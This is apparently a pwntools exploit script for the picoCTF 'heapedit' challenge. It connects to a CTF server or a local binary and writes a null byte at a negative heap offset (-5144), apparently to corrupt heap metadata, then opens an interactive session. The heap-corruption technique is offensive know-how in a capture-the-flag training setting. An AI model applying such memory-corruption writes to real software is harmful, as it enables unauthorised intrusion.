#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 17612)

    return r


def main():
    r = conn()
    input()
    r.sendlineafter(b'Address: ', b'-5144')
    r.sendlineafter(b'Value: ', b'\x00')
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
